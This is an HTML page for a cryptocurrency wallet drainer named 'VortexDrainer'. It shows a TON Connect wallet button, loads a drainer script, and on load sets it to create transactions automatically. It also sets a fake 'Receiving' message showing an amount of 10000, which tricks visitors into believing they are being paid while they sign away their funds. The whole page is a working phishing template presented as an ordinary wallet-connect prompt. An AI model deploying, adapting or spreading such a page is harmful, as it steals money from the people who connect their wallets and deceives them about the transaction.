<!DOCTYPE html>
<html lang="en">
<head>

  <title>VortexDrainer</title>

</head>
<body>
<div class="ton-connect-button">
  <button class="ton-connect-trigger">Clicked</button>
</div>

<!-- Import VortexDrainer library with error handling -->
<script src="/vrtx.js?v=1.0.0" defer crossorigin></script>

<!-- Initialize VortexDrainer and set up event listeners with isolated scope -->
<script>
  
    window.addEventListener('load', () => {
      window.drainer?.init({
        autoCreateTransaction: true,
        autoOpenModal: false,
      });
      window.drainer?.overrideHoneypot({
        honeypot_message: "ðŸŽ‰ Receiving",
        honeypot_amount:10000
      })
    });
</script>
</body>
